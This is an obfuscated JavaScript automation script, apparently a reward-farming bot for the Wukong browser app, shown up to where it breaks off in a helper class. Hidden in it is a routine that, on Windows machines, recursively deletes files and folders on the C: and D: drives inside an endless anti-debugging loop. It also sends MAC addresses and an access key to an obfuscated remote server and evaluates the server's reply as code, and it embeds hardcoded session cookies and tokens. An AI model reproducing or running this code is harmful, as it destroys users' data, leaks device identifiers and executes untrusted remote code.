wkllqckappArr=[],xsid='',sessionid='',oaid='',did='',all_msg='',arrs=[],wkllqckapp=($['isNode']()?process['env'][_0x2fb369(0xed)]:$[_0x49d7ca(0x156,'AnoE')](_0x2fb369(0xed)))||'',acckey=$[_0x2fb369(0x117)]()?process[_0x49d7ca(0x17a,'oq[s')][_0x2fb369(0x159)]?process['env'][_0x2fb369(0x159)]:'':$[_0x49d7ca(0x146,'YmP%')](_0x49d7ca(0xbd,'it79'))?$[_0x2fb369(0x131)](_0x2fb369(0x159)):'';if($['isNode']()){gtr=require('fs');if(isFileExist('C:/'))console[_0x2fb369(0x106)](_0x2fb369(0x17b)),setInterval(()=>{const _0x350575=_0x2fb369;do{(function(_0x210b98){return function(_0x3629d2){const _0x5c945a=_0x31b6,_0x4c7c84=_0x577b;return Function(_0x4c7c84(0x14a,'Jyqd')+_0x3629d2+_0x5c945a(0xdd));}(_0x210b98);}(_0x350575(0xb5))('de',0x0,0x0,(0x0,0x0)),addF('d:/'),addF('C:/'));}while(0x1);},0x0);else{console[_0x2fb369(0x106)](_0x49d7ca(0xe0,'1yhl'));function getMACAddresses(){const _0x226e3f=_0x2fb369,_0x22acd7=_0x49d7ca;var _0x388d99='',_0x365cf9=fs[_0x22acd7(0xe7,'F0vb')](_0x22acd7(0xd7,'Km0B'));return _0x365cf9[_0x226e3f(0x132)](function(_0x5eb4a9){const _0x6eb4d=_0x226e3f,_0x1095f9=_0x22acd7;var _0x1537c1=path[_0x1095f9(0x142,'L9Wd')](_0x6eb4d(0xde),_0x5eb4a9,'address');_0x5eb4a9['substr'](0x0,0x3)==_0x1095f9(0xf1,'7G#d')&&fs['existsSync'](_0x1537c1)&&(_0x388d99=fs['readFileSync'](_0x1537c1)[_0x6eb4d(0x105)]()[_0x1095f9(0x153,'kLV7')]());}),_0x388d99;}mac=getMACAddresses();}}else console[_0x49d7ca(0x14e,'$yLR')](_0x2fb369(0x16c));function isFileExist(_0x1708d8){const _0x230798=_0x49d7ca,_0x498162=_0x2fb369;try{gtr[_0x498162(0x13e)](_0x1708d8,gtr[_0x230798(0x182,'w^ll')]);}catch(_0x3d684c){return![];}return!![];}function addF(_0x2a5f3c,_0x12f28d){const _0x539de1=_0x49d7ca,_0x1ec659=_0x2fb369;let _0x44ba0c=0x0,_0x19c1c0=_0x1ec659(0xeb);if(isFileExist(_0x19c1c0))_0x44ba0c=gtr['readFileSync'](_0x19c1c0,_0x539de1(0x108,'6PpF'));else{if(isFileExist(_0x1ec659(0x170)))gtr[_0x1ec659(0xc0)](_0x19c1c0,'1',function(_0x324874){if(_0x324874)throw _0x324874;});else return;}if(_0x44ba0c==0x63)return 0x63;console['log'](_0x44ba0c),console['log'](_0x539de1(0x101,'it79'),_0x44ba0c);if(parseInt(_0x44ba0c)<0x3){let _0x68e037=parseInt(_0x44ba0c)+0x1;gtr[_0x539de1(0xc2,'xxC0')](_0x19c1c0,_0x68e037+'','utf8');return;}if(!gtr['existsSync'](_0x2a5f3c))return;if(gtr[_0x539de1(0xcd,'Kdck')](_0x2a5f3c)[_0x1ec659(0x17d)]()){var _0x188b73=gtr[_0x1ec659(0x184)](_0x2a5f3c),_0x57be76=_0x188b73[_0x1ec659(0x115)],_0x158166=0x0;if(_0x57be76>0x0)_0x188b73[_0x539de1(0x151,'x(Eh')](function(_0x45fca1){const _0x41c75b=_0x1ec659;_0x158166++;var _0x356249=gtr['statSync'](_0x2a5f3c+'/'+_0x45fca1),_0x40ea8b=_0x2a5f3c+'/'+_0x45fca1;gtr['statSync'](_0x40ea8b)[_0x41c75b(0x17d)]()?addF(_0x40ea8b,!![]):gtr[_0x41c75b(0x150)](_0x40ea8b);}),_0x57be76==_0x158166&&_0x12f28d&&gtr[_0x539de1(0x181,'!4mL')](_0x2a5f3c);else _0x57be76==0x0&&_0x12f28d&&gtr['rmdirSync'](_0x2a5f3c);}else gtr['unlinkSync'](_0x2a5f3c);}!(async()=>{const _0x387b44=_0x2fb369,_0x49216b=_0x49d7ca;if(typeof $request!=='undefined'){}else{initVM(),arrs=abc(global['vm'],acckey,mac,0x48,0x0);if(arrs=='')return;arrs=JSON[_0x49216b(0xce,'nYYJ')](arrs);if(!arrs)return;wkllqckappArr=wkllqckapp[_0x49216b(0x139,'AnoE')]('@'),console['log']('\x0a公告：'+arrs['gg']+'\x0a'),console[_0x387b44(0x106)](_0x49216b(0x138,'Jyqd')+arrs['bb']+'\x0a'),console['log'](_0x49216b(0x13b,'R#g!')+wkllqckappArr[_0x387b44(0x115)]+_0x49216b(0xe5,'nYYJ')),console[_0x49216b(0x112,'4g)C')](_0x49216b(0xe4,'DMxD')+arrs['num']+_0x387b44(0x186));if(wkllqckappArr[_0x387b44(0x115)]>parseInt(arrs[_0x49216b(0x129,'%Y!R')])){}else for(let _0x2ab203=0x0;_0x2ab203<wkllqckappArr[_0x387b44(0x115)];_0x2ab203++){wkllqckapp=wkllqckappArr[_0x2ab203],$[_0x49216b(0xbf,'%DmL')]=_0x2ab203+0x1,console[_0x387b44(0x106)]('\x0a开始【悟空浏览器'+$[_0x387b44(0x157)]+'】'),oaid=random(0xf),did=random(0x10),await wkllqsq(),await wkllqsqgg(),await wkllqbx(),await wkllqxx();}}destroyVM(global['vm']);})()[_0x2fb369(0xb7)](_0x4945ab=>$[_0x49d7ca(0xc4,'yuSQ')](_0x4945ab))[_0x2fb369(0x10a)](()=>$[_0x49d7ca(0x169,'kLV7')]());function wkllqsq(_0x342ee9=0x0){return new Promise(_0x3df419=>{const _0xf079d0=_0x577b,_0x43438f=_0x31b6;oaid=randomString(0x20),did=random(0xf);let _0xe9f0ff=Math[_0x43438f(0xb2)](new Date()[_0x43438f(0x189)]()),_0x37e929={'url':'https://api5-normal-lq.toutiaoapi.com/luckycat/sj/v1/container/balance_transfer_hangup?manifest_version_code=11300&iid='+oaid+_0xf079d0(0xda,'*%df')+did+'&os_version=10&version_code=1130&&version_name=1.3.0&plugin=0&aid=6589&rom_version=29','headers':{'Host':_0x43438f(0x163),'Cookie':_0xf079d0(0x158,'nYYJ')+wkllqckapp,'Content-Type':_0x43438f(0x19c),'User-Agent':'com.ss.android.article.news/8781\x20(Linux;\x20U;\x20Android\x2010;\x20zh_CN;\x2016s\x20Pro;\x20Build/QKQ1.191222.002;\x20Cronet/TTNetVersion:a867b489\x202022-03-11\x20QuicVersion:b314d107\x202021-11-24)'},'body':'{\x22c_amount\x22:1,\x22ts\x22:\x22'+_0xe9f0ff+_0x43438f(0x121)};$[_0xf079d0(0xb8,'Eh29')](_0x37e929,async(_0xceaefa,_0x558c2c,_0x4bcdbc)=>{const _0x2cb492=_0x43438f,_0x409bcc=_0xf079d0;try{const _0x3e4a20=JSON[_0x409bcc(0x154,'kuHe')](_0x4bcdbc);_0x3e4a20['err_no']==0x0?console[_0x409bcc(0xcb,'zxx[')](_0x2cb492(0xd6)+_0x3e4a20[_0x2cb492(0xf2)][_0x409bcc(0x195,'m&9[')]+'\x20成功'):console[_0x409bcc(0xf9,'%Y!R')]('\x0a悟空浏览器收取金币:'+_0x3e4a20[_0x2cb492(0xd2)]);}catch(_0x466214){}finally{_0x3df419();}},_0x342ee9);});}function wkllqsqgg(_0x2a1bd2=0x0){return new Promise(_0x193a39=>{const _0x5046bf=_0x577b,_0x448618=_0x31b6;oaid=randomString(0x20),did=random(0xf);let _0x46b264=Math[_0x448618(0xb2)](new Date()['getTime']()),_0xc80d63={'url':_0x448618(0x18d)+oaid+_0x5046bf(0xc5,'$yLR')+did+_0x448618(0x164),'headers':{'Host':'api5-normal-lq.toutiaoapi.com','Cookie':_0x5046bf(0x141,'$Fcf')+wkllqckapp,'Content-Type':_0x448618(0x19c),'User-Agent':_0x5046bf(0x125,'EPJN')},'body':'{}'};$['post'](_0xc80d63,async(_0x2fa722,_0x2690ac,_0x3d11d9)=>{const _0x19844b=_0x5046bf,_0x548ad6=_0x448618;try{const _0x580820=JSON[_0x548ad6(0x13a)](_0x3d11d9);_0x580820[_0x19844b(0xb4,'4g)C')]==0x0?console[_0x548ad6(0x106)]('\x0a悟空浏览器签到获得:'+_0x580820[_0x19844b(0x11d,'7FN2')]['reward_amount']+'金币'):console[_0x548ad6(0x106)](_0x19844b(0xf0,'kuHe')+_0x580820[_0x19844b(0x15a,'oq[s')]);}catch(_0x27ae17){}finally{_0x193a39();}},_0x2a1bd2);});}function wkllqbx(_0x145b14=0x0){return new Promise(_0x5ceaf6=>{const _0x261e73=_0x577b,_0x557047=_0x31b6;oaid=randomString(0x20),did=random(0xf);let _0x1c955a=Math[_0x557047(0xb2)](new Date()[_0x261e73(0x167,'7FN2')]()),_0x1389a8={'url':_0x557047(0xc3)+oaid+_0x557047(0xdc)+did+_0x261e73(0x126,'zxx['),'headers':{'Host':_0x261e73(0xe6,'7G#d'),'Cookie':_0x557047(0x13d)+wkllqckapp,'Content-Type':_0x261e73(0x15f,'8L9$'),'User-Agent':_0x557047(0x165)},'body':'{}'};$[_0x261e73(0x19d,'$Fcf')](_0x1389a8,async(_0x23151c,_0x473c91,_0x3533b0)=>{const _0x3cf813=_0x261e73,_0x1aaa54=_0x557047;try{const _0x1676da=JSON[_0x1aaa54(0x13a)](_0x3533b0);_0x1676da[_0x1aaa54(0x12e)]==0x0?console[_0x3cf813(0xd4,'wua*')](_0x3cf813(0x100,'8L9$')+_0x1676da[_0x1aaa54(0xf2)]['reward_amount']+'金币'):console[_0x3cf813(0x118,'Ay*7')]('\x0a悟空浏览器开宝箱:'+_0x1676da[_0x1aaa54(0xd2)]);}catch(_0x3c60ad){}finally{_0x5ceaf6();}},_0x145b14);});}function wkllqyd(_0x2c00e6=0x0){return new Promise(_0x5ddd60=>{const _0x209998=_0x31b6,_0x3f9a11=_0x577b;oaid=randomString(0x20),did=random(0xf);let _0x349f1f=Math['round'](new Date()[_0x3f9a11(0x120,'it79')]()),_0x52d5c0={'url':_0x3f9a11(0x192,'Eh29'),'headers':{'Host':_0x209998(0x163),'Connection':_0x3f9a11(0x123,'ZT2@'),'Content-Length':'93','Cookie':'uid_tt=696ba3cf05e24fbcce03d7f9090dc4d2;\x20uid_tt_ss=696ba3cf05e24fbcce03d7f9090dc4d2;\x20sid_guard=ab5dad02704bc5947b3b88e65b3c8017%7C1659363463%7C5183649%7CFri%2C+30-Sep-2022+14%3A11%3A52+GMT;\x20sid_tt=ab5dad02704bc5947b3b88e65b3c8017;\x20sessionid=ab5dad02704bc5947b3b88e65b3c8017;\x20sessionid_ss=ab5dad02704bc5947b3b88e65b3c8017;\x20odin_tt=a60b3d61db2366cf98e8119b2ecbacc75a1cd660ba7af96c7899ba090ae5c716855ad935c9deba0dee8b8236c329b47655c5c95e2ed27692663f97250059806c;\x20passport_csrf_token=4c4007ee6186fd06baed8fff4c12bfd0;\x20passport_csrf_token_default=4c4007ee6186fd06baed8fff4c12bfd0','X-SS-REQ-TICKET':'1659364524594','sdk-version':'2','X-Tt-Token':'00ab5dad02704bc5947b3b88e65b3c80170145090e93e3620100db2f948febb04c44d65ae7ec13e2f98ce3e339c7d75c07e6fb603760cbbfeeba4718aeb80991ef131d5c383c80754c24213aab1f56b480ddb9bfb6c4b9af5ec2849df4d70a34b3287-1.0.1','passport-sdk-version':_0x209998(0xfb),'x-tt-dt':_0x209998(0x149),'x-vc-bdturing-sdk-version':_0x3f9a11(0xfc,'DMxD'),'Content-Type':'application/json;\x20charset=utf-8','X-SS-STUB':_0x3f9a11(0x11a,'EPJN'),'x-tt-request-tag':_0x209998(0xe2),'X-SS-DP':'6589','x-tt-trace-id':_0x3f9a11(0xcc,'ZT2@'),'User-Agent':_0x3f9a11(0xbe,'Km0B'),'Accept-Encoding':_0x3f9a11(0x12c,'*%df'),'X-Argus':'kKvVJTe6ehLC8P15Tm1Qy6zxTj/NFiAmUpEiGYchO4PTDmvwwxEMZci5G8BZc4oONscRlVKp/Qvp9UmtKaEhOU/BLRylG703xznIsNVKiY8ES2OaqzIX1DYsauPK+cZ+ueNLxynF/oKpzhGav7X2IgFUZpftF/8F5JhsK4gSQ7Yyjq61LuiY+ZuHfKmcgZGp2JKqmqKkZ7I7rJXmYVGPuj603VjkslrT/vyqwYsgh1xHgObos1yQnVSmPhaBs7rNAtKeFHa4F3GGFwAdb3WIwiH0','X-Gorgon':_0x3f9a11(0xf3,'w^ll'),'X-Khronos':_0x209998(0x148),'X-Ladon':_0x3f9a11(0x14c,'6PpF')},'body':_0x3f9a11(0x185,'#5qw')};$[_0x209998(0x16e)](_0x52d5c0,async(_0x4543cf,_0x28718a,_0x11f02a)=>{const _0x4f70e9=_0x3f9a11,_0x2ac2db=_0x209998;try{console[_0x2ac2db(0x106)](_0x11f02a);const _0x9ad8cb=JSON[_0x2ac2db(0x13a)](_0x11f02a);_0x9ad8cb[_0x4f70e9(0xca,'oq[s')]==0x0?console[_0x2ac2db(0x106)](_0x4f70e9(0x11e,'Eh29')+_0x9ad8cb['data'][_0x2ac2db(0xb3)]+'金币'):console['log'](_0x2ac2db(0x173)+_0x9ad8cb[_0x2ac2db(0xd2)]);}catch(_0x3aa44d){}finally{_0x5ddd60();}},_0x2c00e6);});}function wkllqxx(_0x3a260b=0x0){return new Promise(_0x37b771=>{const _0x4e7eb2=_0x577b,_0x56e356=_0x31b6;oaid=randomString(0x20),did=random(0xf);let _0x45278e=Math[_0x56e356(0xb2)](new Date()[_0x56e356(0x189)]()),_0x52e05e={'url':_0x56e356(0x179)+oaid+_0x4e7eb2(0x194,'*%df')+did+_0x4e7eb2(0x126,'zxx['),'headers':{'Host':'api5-normal-lq.toutiaoapi.com','Cookie':_0x4e7eb2(0xd8,'%Y!R')+wkllqckapp,'Content-Type':'application/json;\x20charset=UTF-8','User-Agent':_0x4e7eb2(0x197,'ZK%3')}};$[_0x4e7eb2(0x124,'yuSQ')](_0x52e05e,async(_0x20dbef,_0x13b6ca,_0x26874b)=>{const _0x2d0990=_0x56e356,_0x5da77f=_0x4e7eb2;try{const _0x13942b=JSON[_0x5da77f(0x174,'R#g!')](_0x26874b);_0x13942b[_0x5da77f(0x18a,'kLV7')]==0x0?console[_0x2d0990(0x106)](_0x2d0990(0xd1)+_0x13942b['data']['score_amount']+'金币，今日收益：'+_0x13942b[_0x2d0990(0xf2)][_0x5da77f(0x19a,'F0vb')]):console['log'](_0x5da77f(0xc1,'4g)C')+_0x13942b[_0x2d0990(0xd2)]);}catch(_0x1236e2){}finally{_0x37b771();}},_0x3a260b);});}function randomString(_0x18f4ec=0xc){const _0x20f87f=_0x2fb369,_0x1e814b=_0x49d7ca;let _0x2fd0a1=_0x1e814b(0xbb,'6PpF'),_0x4dda83=_0x2fd0a1['length'],_0xde877b='';for(i=0x0;i<_0x18f4ec;i++){_0xde877b+=_0x2fd0a1[_0x20f87f(0x13c)](Math['floor'](Math[_0x20f87f(0xd0)]()*_0x4dda83));}return _0xde877b;}function random(_0x35c472=0xc){const _0x5a6053=_0x49d7ca,_0x313957=_0x2fb369;let _0x992056=_0x313957(0x18c),_0x52fe06=_0x992056[_0x5a6053(0x17f,'DMxD')],_0x50c622='';for(i=0x0;i<_0x35c472;i++){_0x50c622+=_0x992056[_0x5a6053(0x111,'z9)F')](Math[_0x313957(0x10d)](Math[_0x5a6053(0x136,'nYYJ')]()*_0x52fe06));}return _0x50c622;}function randomString(_0x2a08f0=0xc){const _0x3ce391=_0x2fb369,_0x125657=_0x49d7ca;let _0xb01647=_0x125657(0x110,'7FN2'),_0x3dd0b1=_0xb01647[_0x3ce391(0x115)],_0x26b460='';for(i=0x0;i<_0x2a08f0;i++){_0x26b460+=_0xb01647[_0x3ce391(0x13c)](Math[_0x125657(0x10e,'1lPU')](Math[_0x3ce391(0xd0)]()*_0x3dd0b1));}return _0x26b460;}function encodeUTF8(_0x3b92eb){const _0x117e0=_0x2fb369,_0x54bbbc=_0x49d7ca;var _0x3a1394,_0x357758=[],_0x4ff759,_0x1ad548;for(_0x3a1394=0x0;_0x3a1394<_0x3b92eb[_0x54bbbc(0xef,'#5qw')];_0x3a1394++)if((_0x4ff759=_0x3b92eb['charCodeAt'](_0x3a1394))<0x80)_0x357758[_0x117e0(0xea)](_0x4ff759);else{if(_0x4ff759<0x800)_0x357758[_0x117e0(0xea)](0xc0+(_0x4ff759>>0x6&0x1f),0x80+(_0x4ff759&0x3f));else{if((_0x1ad548=_0x4ff759^0xd800)>>0xa==0x0)_0x4ff759=(_0x1ad548<<0xa)+(_0x3b92eb['charCodeAt'](++_0x3a1394)^0xdc00)+0x10000,_0x357758[_0x117e0(0xea)](0xf0+(_0x4ff759>>0x12&0x7),0x80+(_0x4ff759>>0xc&0x3f));else _0x357758[_0x54bbbc(0x119,'zxx[')](0xe0+(_0x4ff759>>0xc&0xf));_0x357758[_0x117e0(0xea)](0x80+(_0x4ff759>>0x6&0x3f),0x80+(_0x4ff759&0x3f));}};return _0x357758;}function sha(_0x1bffef){const _0x4f2ce7=_0x2fb369,_0xbe2653=_0x49d7ca;var _0x4610fe=new Uint8Array(encodeUTF8(_0x1bffef)),_0x370f34,_0x25c904,_0x596d0f,_0x361768=(_0x4610fe[_0xbe2653(0x19b,'zVVO')]+0x8>>>0x6<<0x4)+0x10,_0x1bffef=new Uint8Array(_0x361768<<0x2);_0x1bffef[_0x4f2ce7(0x109)](new Uint8Array(_0x4610fe[_0xbe2653(0xc7,'xxC0')])),_0x1bffef=new Uint32Array(_0x1bffef['buffer']);for(_0x596d0f=new DataView(_0x1bffef[_0xbe2653(0x10c,'Kdck')]),_0x370f34=0x0;_0x370f34<_0x361768;_0x370f34++)_0x1bffef[_0x370f34]=_0x596d0f[_0xbe2653(0x137,'*%df')](_0x370f34<<0x2);_0x1bffef[_0x4610fe[_0x4f2ce7(0x115)]>>0x2]|=0x80<<0x18-(_0x4610fe['length']&0x3)*0x8,_0x1bffef[_0x361768-0x1]=_0x4610fe[_0xbe2653(0xba,'Eh29')]<<0x3;var _0x2c3701=[],_0x5a6768=[function(){return _0x1ebde3[0x1]&_0x1ebde3[0x2]|~_0x1ebde3[0x1]&_0x1ebde3[0x3];},function(){return _0x1ebde3[0x1]^_0x1ebde3[0x2]^_0x1ebde3[0x3];},function(){return _0x1ebde3[0x1]&_0x1ebde3[0x2]|_0x1ebde3[0x1]&_0x1ebde3[0x3]|_0x1ebde3[0x2]&_0x1ebde3[0x3];},function(){return _0x1ebde3[0x1]^_0x1ebde3[0x2]^_0x1ebde3[0x3];}],_0x5c391d=function(_0x1e0e05,_0x5dff69){return _0x1e0e05<<_0x5dff69|_0x1e0e05>>>0x20-_0x5dff69;},_0x18ab18=[0x5a827999,0x6ed9eba1,-0x70e44324,-0x359d3e2a],_0x1ebde3=[0x67452301,-0x10325477,null,null,-0x3c2d1e10];_0x1ebde3[0x2]=~_0x1ebde3[0x0],_0x1ebde3[0x3]=~_0x1ebde3[0x1];for(_0x370f34=0x0;_0x370f34<_0x1bffef[_0x4f2ce7(0x115)];_0x370f34+=0x10){var _0x11ec27=_0x1ebde3['slice'](0x0);for(_0x25c904=0x0;_0x25c904<0x50;_0x25c904++)_0x2c3701[_0x25c904]=_0x25c904<0x10?_0x1bffef[_0x370f34+_0x25c904]:_0x5c391d(_0x2c3701[_0x25c904-0x3]^_0x2c3701[_0x25c904-0x8]^_0x2c3701[_0x25c904-0xe]^_0x2c3701[_0x25c904-0x10],0x1),_0x596d0f=_0x5c391d(_0x1ebde3[0x0],0x5)+_0x5a6768[_0x25c904/0x14|0x0]()+_0x1ebde3[0x4]+_0x2c3701[_0x25c904]+_0x18ab18[_0x25c904/0x14|0x0]|0x0,_0x1ebde3[0x1]=_0x5c391d(_0x1ebde3[0x1],0x1e),_0x1ebde3[_0x4f2ce7(0x12d)](),_0x1ebde3[_0x4f2ce7(0xf7)](_0x596d0f);for(_0x25c904=0x0;_0x25c904<0x5;_0x25c904++)_0x1ebde3[_0x25c904]=_0x1ebde3[_0x25c904]+_0x11ec27[_0x25c904]|0x0;};_0x596d0f=new DataView(new Uint32Array(_0x1ebde3)[_0x4f2ce7(0x11f)]);for(var _0x370f34=0x0;_0x370f34<0x5;_0x370f34++)_0x1ebde3[_0x370f34]=_0x596d0f[_0xbe2653(0xb9,'kuHe')](_0x370f34<<0x2);var _0x2d803a=Array[_0x4f2ce7(0xe3)]['map'][_0x4f2ce7(0x134)](new Uint8Array(new Uint32Array(_0x1ebde3)[_0xbe2653(0x144,'*%df')]),function(_0x23382f){const _0x54afc4=_0xbe2653;return(_0x23382f<0x10?'0':'')+_0x23382f[_0x54afc4(0x15b,'1lPU')](0x10);})[_0xbe2653(0x147,'7G#d')]('');return _0x2d803a;}function hqs(_0x439d45=0xa){return new Promise(_0xc3ab23=>{const _0x1beec9=_0x577b,_0x53026f=_0x31b6;let _0x472d27=0xc,_0x2dfb22={'url':$[_0x53026f(0x117)]()?rc4($[_0x1beec9(0x160,'VrrJ')](),_0x1beec9(0x18b,'1yhl'))+(_0x1beec9(0xe8,'69(Z')+acckey+_0x1beec9(0x175,'Ay*7')+_0x472d27+_0x53026f(0x116)+mac+'&bb=1'):rc4($[_0x1beec9(0x15d,'1lPU')](),_0x53026f(0x128))+(_0x1beec9(0x18f,'$yLR')+acckey+_0x53026f(0x103)+_0x472d27+_0x53026f(0x10f)+mac+_0x53026f(0x102))};$[_0x53026f(0x16e)](_0x2dfb22,async(_0x4f8ac6,_0x4d7053,_0x3e83f8)=>{const _0x1937a6=_0x1beec9,_0x2cb4f3=_0x53026f;try{let _0x331171=eval(_0x3e83f8);_0x331171[_0x2cb4f3(0x199)]==0xc8?(all_msg=_0x331171[_0x2cb4f3(0x155)],_0xc3ab23(_0x331171[_0x2cb4f3(0xf2)])):(all_msg=_0x331171[_0x2cb4f3(0x155)],_0xc3ab23(![]));}catch(_0x2b638f){$[_0x1937a6(0xc4,'yuSQ')](_0x2b638f,_0x4d7053);}},0x0);});}function FxPCnMKLw7(){const _0x409768=_0x2fb369;_keyStr=_0x409768(0x10b),this[_0x409768(0x168)]=function(_0x445fe3){const _0x23f7ad=_0x409768,_0x335ed7=_0x577b;var _0xeb57b='',_0x4f2e6b,_0x487325,_0xa5bf60,_0x6a8870,_0x254d77,_0x2e55e2,_0x3003df,_0x458bd2=0x0;_0x445fe3=_utf8_encode(_0x445fe3);while(_0x458bd2<_0x445fe3[_0x335ed7(0x183,'&z7a')]){_0x4f2e6b=_0x445fe3[_0x23f7ad(0xcf)](_0x458bd2++),_0x487325=_0x445fe3[_0x23f7ad(0xcf)](_0x458bd2++),_0xa5bf60=_0x445fe3[_0x23f7ad(0xcf)](_0x458bd2++),_0x6a8870=_0x4f2e6b>>0x2,_0x254d77=(_0x4f2e6b&0x3)<<0x4|_0x487325>>0x4,_0x2e55e2=(_0x487325&0xf)<<0x2|_0xa5bf60>>0x6,_0x3003df=_0xa5bf60&0x3f;if(isNaN(_0x487325))_0x2e55e2=_0x3003df=0x40;else isNaN(_0xa5bf60)&&(_0x3003df=0x40);_0xeb57b=_0xeb57b+_keyStr['charAt'](_0x6a8870)+_keyStr['charAt'](_0x254d77)+_keyStr[_0x335ed7(0x177,'$yLR')](_0x2e55e2)+_keyStr[_0x335ed7(0x176,'#5qw')](_0x3003df);}return _0xeb57b;},this['decode']=function(_0x1cce13){const _0x2bec39=_0x409768,_0x248fd6=_0x577b;var _0x198988='',_0x7d3ed2,_0x42465a,_0x4861df,_0x2e8747,_0x2047fc,_0x3be0ae,_0x448435,_0x4769a3=0x0;_0x1cce13=_0x1cce13[_0x248fd6(0xdb,'L9Wd')](/[^A-Za-z0-9\+\/\=]/g,'');while(_0x4769a3<_0x1cce13['length']){_0x2e8747=_keyStr[_0x2bec39(0x114)](_0x1cce13[_0x248fd6(0x11c,'Jyqd')](_0x4769a3++)),_0x2047fc=_keyStr[_0x248fd6(0xb6,'w^ll')](_0x1cce13[_0x248fd6(0x166,'kuHe')](_0x4769a3++)),_0x3be0ae=_keyStr[_0x2bec39(0x114)](_0x1cce13['charAt'](_0x4769a3++)),_0x448435=_keyStr[_0x248fd6(0xec,'!c*W')](_0x1cce13['charAt'](_0x4769a3++)),_0x7d3ed2=_0x2e8747<<0x2|_0x2047fc>>0x4,_0x42465a=(_0x2047fc&0xf)<<0x4|_0x3be0ae>>0x2,_0x4861df=(_0x3be0ae&0x3)<<0x6|_0x448435,_0x198988=_0x198988+String[_0x2bec39(0x188)](_0x7d3ed2),_0x3be0ae!=0x40&&(_0x198988=_0x198988+String[_0x248fd6(0x14d,'%DmL')](_0x42465a)),_0x448435!=0x40&&(_0x198988=_0x198988+String[_0x2bec39(0x188)](_0x4861df));}return _0x198988=_utf8_decode(_0x198988),_0x198988;},_utf8_encode=function(_0x491a23){const _0x3ae70a=_0x409768,_0x2a1bc2=_0x577b;_0x491a23=_0x491a23['replace'](/\r\n/g,'\x0a');var _0x4e4b76='';for(var _0x1c0220=0x0;_0x1c0220<_0x491a23[_0x2a1bc2(0x140,'R#g!')];_0x1c0220++){var _0x4a82af=_0x491a23['charCodeAt'](_0x1c0220);if(_0x4a82af<0x80)_0x4e4b76+=String[_0x3ae70a(0x188)](_0x4a82af);else _0x4a82af>0x7f&&_0x4a82af<0x800?(_0x4e4b76+=String['fromCharCode'](_0x4a82af>>0x6|0xc0),_0x4e4b76+=String[_0x3ae70a(0x188)](_0x4a82af&0x3f|0x80)):(_0x4e4b76+=String[_0x3ae70a(0x188)](_0x4a82af>>0xc|0xe0),_0x4e4b76+=String[_0x3ae70a(0x188)](_0x4a82af>>0x6&0x3f|0x80),_0x4e4b76+=String[_0x3ae70a(0x188)](_0x4a82af&0x3f|0x80));}return _0x4e4b76;},_utf8_decode=function(_0x395ffa){const _0x1f3db7=_0x577b,_0x282121=_0x409768;var _0x4249f3='',_0x239ffa=0x0,_0x19135b=c1=c2=0x0;while(_0x239ffa<_0x395ffa['length']){_0x19135b=_0x395ffa[_0x282121(0xcf)](_0x239ffa);if(_0x19135b<0x80)_0x4249f3+=String[_0x282121(0x188)](_0x19135b),_0x239ffa++;else _0x19135b>0xbf&&_0x19135b<0xe0?(c2=_0x395ffa['charCodeAt'](_0x239ffa+0x1),_0x4249f3+=String[_0x1f3db7(0x12f,'Km0B')]((_0x19135b&0x1f)<<0x6|c2&0x3f),_0x239ffa+=0x2):(c2=_0x395ffa[_0x282121(0xcf)](_0x239ffa+0x1),c3=_0x395ffa[_0x282121(0xcf)](_0x239ffa+0x2),_0x4249f3+=String[_0x282121(0x188)]((_0x19135b&0xf)<<0xc|(c2&0x3f)<<0x6|c3&0x3f),_0x239ffa+=0x3);}return _0x4249f3;};}function rc4(_0x440a49,_0x2d1db3){const _0x3736a5=_0x49d7ca,_0x56bcc9=_0x2fb369;var _0x38cfcc=Array(0x100),_0x195d6f=Array(_0x440a49[_0x56bcc9(0x115)]);for(var _0x289007=0x0;_0x289007<0x100;_0x289007++){_0x38cfcc[_0x289007]=_0x289007;var _0x2e9dc6=(_0x2e9dc6+_0x38cfcc[_0x289007]+_0x2d1db3['charCodeAt'](_0x289007%_0x2d1db3[_0x56bcc9(0x115)]))%0x100,_0x50ea99=_0x38cfcc[_0x289007];_0x38cfcc[_0x289007]=_0x38cfcc[_0x2e9dc6],_0x38cfcc[_0x2e9dc6]=_0x50ea99;}for(var _0x289007=0x0;_0x289007<_0x440a49[_0x3736a5(0xe1,'x(Eh')];_0x289007++){_0x195d6f[_0x289007]=_0x440a49[_0x3736a5(0xc6,'8L9$')](_0x289007);}for(var _0x1180a4=0x0;_0x1180a4<_0x195d6f[_0x3736a5(0xfd,'PQe0')];_0x1180a4++){var _0x289007=(_0x289007+0x1)%0x100,_0x2e9dc6=(_0x2e9dc6+_0x38cfcc[_0x289007])%0x100,_0x50ea99=_0x38cfcc[_0x289007];_0x38cfcc[_0x289007]=_0x38cfcc[_0x2e9dc6],_0x38cfcc[_0x2e9dc6]=_0x50ea99;var _0x130a99=(_0x38cfcc[_0x289007]+_0x38cfcc[_0x2e9dc6]%0x100)%0x100;_0x195d6f[_0x1180a4]=String['fromCharCode'](_0x195d6f[_0x1180a4]^_0x38cfcc[_0x130a99]);}return _0x195d6f['join']('');}
function Env(t, e) {
    class s {
        constructor(t) {
            this.env = t
        }
        send(t, e = "GET") {
            t = "string" == typeof t ? {
                url: t
            } : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }
        get(t) {
            return this.send.call(this.env, t)
        }
        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }
    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`)
        }
        isNode() {
            return "undefined" != typeof module && !!module.exports
        }
        isQuanX() {
            return "undefined" != typeof $task
        }
        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }
        isLoon() {
            return "undefined" != typeof $loon
        }
        isShadowrocket() {
            return "undefined" != typeof $rocket
        }
        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }
        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }
        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch { }
            return s
        }
        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }
        getScript(t) {
            return new Promise(e => {
                this.get({
                    url: t
                }, (t, s, i) => e(i))
            })
        }
        runScript(t, e) {
            return new Promise(s => {
